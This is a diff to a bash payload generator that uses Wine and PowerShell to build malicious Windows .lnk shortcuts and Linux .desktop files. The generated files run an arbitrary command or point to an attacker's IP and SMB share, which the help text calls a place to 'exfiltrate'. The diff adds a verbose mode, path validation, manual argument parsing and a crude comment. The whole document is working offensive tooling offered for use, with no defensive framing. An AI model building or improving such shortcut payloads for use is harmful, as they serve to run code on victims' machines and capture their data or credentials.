@@ -10,9 +10,9 @@ RESET="\033[0m"
 # Set the WINEPREFIX_DIRECTORY to the user's home directory
 WINEPREFIX_DIRECTORY="${HOME}/.wine"
 
-VERSION=
-ARGUMENTS=""
+PAYLOAD=""
 COMMAND=""
+ARGUMENTS=""
 IP=""
 ENVIRONMENT=""
 SHARE=""
@@ -22,7 +22,8 @@ ICON=""
 WINDOW=""
 WORKINGDIRECTORY=""
 OUTPUT=""
-PAYLOAD=""
+VERBOSE=0
+VERSION=0
 
 function check_program() {
     type -P "${1}" 2>/dev/null
@@ -63,7 +64,7 @@ function quit() {
 }
 
 function check_dependencies() {
-    local -a programs=("getopt" "wine" "desktop-file-edit")
+    local -a programs=("wine" "desktop-file-edit")
     local -a missing=()
     local -a powershell=("${WINEPREFIX_DIRECTORY}/drive_c/Program Files/PowerShell/"*/pwsh.exe)
 
@@ -77,10 +78,7 @@ function check_dependencies() {
     do
         if [[ -z $(check_program "${program}") ]]
         then
-            if [[ "${program}" == "getopt" ]]
-            then
-                missing+=("util-linux")
-            elif [[ "${program}" == "desktop-file-edit" ]]
+            if [[ "${program}" == "desktop-file-edit" ]]
             then
                 missing+=("desktop-file-utils")
             else
@@ -129,6 +127,8 @@ function generate() {
             [maximized]=3
             [minimized]=7
         )
+        local unc_path_pattern="^\\\\"
+        local drive_pattern="^([[:alpha:]]:)([/\\\\]?.*|$)"
         local temp
         local temporary_file
         local script
@@ -141,20 +141,32 @@ function generate() {
 
         if [[ -n "${command}" ]]
         then
-            if [[ -n "${arguments}" && "${#arguments}" -lt 260 ]]
+            if [[ "${command}" =~ ${unc_path_pattern} ]]
             then
-                script+="\$Shortcut.TargetPath = '${command}'\n"
-                script+="\$Shortcut.Arguments = '${arguments}'\n"
-            elif (("${#arguments}" >= 260))
-            then
-                error "Arguments must not exceed more than 260 characters"
+                error "Wine has limitation for TargetPath when specifying a UNC path."
+                info "Specify the IP address (-i) instead."
                 quit 1
-            elif [[ -z "${arguments}" ]]
+            elif [[ "${command}" =~ ${drive_pattern} ]] # Checks the drive letter letter
             then
-                error "Command and arguments must be passed!"
+                if [[ -n "${arguments}" && "${#arguments}" -lt 260 ]]
+                then
+                    script+="\$Shortcut.TargetPath = '${command}'\n"
+                    script+="\$Shortcut.Arguments = '${arguments}'\n"
+                elif (("${#arguments}" >= 260))
+                then
+                    error "Arguments must not exceed more than 260 characters"
+                    quit 1
+                elif [[ -z "${arguments}" ]]
+                then
+                    error "Command and arguments must be passed!"
+                    quit 1
+                fi
+            else
+                error "Invalid drive letter!"
+                print "TargetPath: '${command}'"
                 quit 1
             fi
-        elif [[ -n "${IP}" ]] # check if IP is passed if command is not passed
+        elif [[ -n "${IP}" ]] # Checks if IP is passed if command is not passed
         then
             local unc
             if [[ -z "${SHARE}" ]]
@@ -234,7 +246,14 @@ function generate() {
         # Save the temporary PowerShell script then remove it after generation
         temporary_file=$(mktemp --suffix '.ps1')
         echo -e "${script}" > "${temporary_file}"
-        eval "${execute[*]} pwsh.exe -ExecutionPolicy Bypass -File ${temporary_file} 2>/dev/null"
+
+        if ((VERBOSE == 1))
+        then
+            eval "${execute[*]} pwsh.exe -ExecutionPolicy Bypass -File ${temporary_file}"
+        else
+            eval "${execute[*]} pwsh.exe -ExecutionPolicy Bypass -File ${temporary_file} 2>/dev/null"
+        fi
+
         rm -f "${temporary_file}"
 
         fin "Payload has been generated!"
@@ -258,7 +277,7 @@ function generate() {
 
         if [[ -n "${command}" && -n "${arguments}" ]]
         then
-            if (("${#arguments}" <= 2090326))
+            if (("${#arguments}" >= 2090326))
             then
                 error "Arguments must not exceed more than 2090326 characters"
                 quit 1
@@ -315,8 +334,13 @@ function generate() {
         execute+=("--remove-key=\"X-Desktop-File-Install-Version\"")
         touch "${OUTPUT}"
 
+        if ((VERBOSE == 1))
+        then
+            eval "${execute[*]} ${OUTPUT}"
+        else
+            eval "${execute[*]} ${OUTPUT} &>/dev/null"
+        fi
         fin "Payload has been generated!"
-        eval "${execute[*]} ${OUTPUT} &>/dev/null"
     }
 
     if [[ -f "${OUTPUT}" ]]
@@ -338,9 +362,9 @@ function generate() {
         esac
 }
 
+# I need to tell the user how to fucking use me
 function usage() {
-    echo "Usage: $(basename ${0}) <flags>
-Flags:
+    print "Usage: $(basename "${0}") <flags>
     -p, --payload                       Specify a payload module ('lnk', 'desktop').
     -c, --command                       Specify a command to execute.
     -a, --arguments                     Optionally pass the arguments (except it is
@@ -351,19 +375,20 @@ Flags:
                                         exfiltrate.
     -s, --share                         Specify an SMB share (applies with -h flag
                                         when it's optional for 'lnk' payload module).
-    -n, --name                          Specify a name. It is optional when 'lnk'
+    -n, --name                          Specify a name. It is optional when 'lnk' is specified.
                                         payload module is specified (applies with -h flag).
                                         For 'desktop' payload module it is mandatory.
     -d, --description                   Specify the description of the payload.
-    --icon                              Specify a custom icon.
+    -ic, --icon                         Specify a custom icon.
     -w, --window                        Specify a window. For 'lnk' payload windowstyle
                                         'normal' is set by default if not specified.
                                         The available windowstyles are: 'normal', 'maximized',
                                         and 'minimized'. For 'desktop' payload it is set to
                                         'false', the available options are: 'true' and 'false'.
-    --workingdirectory                  Specify a working directory.
+    -wd, --workingdirectory             Specify a working directory.
     -o, --output                        Specify an output.
-    -v, --version                       Display the program's version number.
+    -v, --verbose                       Display more information.
+    -V, --version                       Display the program's version number.
     -h, --help                          Display the help menu."
 
     quit 0
@@ -371,20 +396,14 @@ Flags:
 
 function main() {
     local directory
+    local version="v1.5"
 
-    local options="p:c:a:i:e:s:n:d:w:o:v:h"
-    local long_options="payload:,command:,arguments:,ip:,environment:,share:,name:,description:,icon:,window:,workingdirectory:,output:,version:,help"
-    local parsed_options=$(getopt -o "${options}" -l "${long_options}" -n "$(basename "${0}")" -- "${@}")
-
-    if ((${?} != 0))
+    if ((${#} == 0))
     then
-        error "Failed to parse options... Exiting." >&2
-        quit 1
+        usage
     fi
 
-    eval set -- "${parsed_options}"
-
-    while true
+    while ((${#} > 0))
     do
         case "${1}" in
             -p | --payload)
@@ -419,7 +438,7 @@ function main() {
                 DESCRIPTION="${2}"
                 shift 2
                 ;;
-            --icon)
+            -ic | --icon)
                 ICON="${2}"
                 shift 2
                 ;;
@@ -427,7 +446,7 @@ function main() {
                 WINDOW="${2,,}"
                 shift 2
                 ;;
-            --workingdirectory)
+            -wd | --workingdirectory)
                 WORKINGDIRECTORY="${2}"
                 shift 2
                 ;;
@@ -435,16 +454,16 @@ function main() {
                 OUTPUT="${2}"
                 shift 2
                 ;;
-            -v | --version)
+            -v | --verbose)
+                VERBOSE=1
+                shift
+                ;;
+            -V | --version)
                 VERSION=1
                 shift
                 ;;
             -h | --help)
                 usage
-                ;;
-            --)
-                shift
-                break
                 ;;
             *)
                 error "Invalid option: ${1}" >&2
@@ -456,7 +475,7 @@ function main() {
     trap quit SIGINT
     check_dependencies
 
-    ((VERSION == 1)) && echo "${0} version: v1.2"
+    ((VERSION == 1)) && echo "${0} version: ${version}" && quit 0
 
     # Require either -c or -i (but not both) for 'lnk' payloads
     if [[ "${PAYLOAD}" == "lnk" ]]
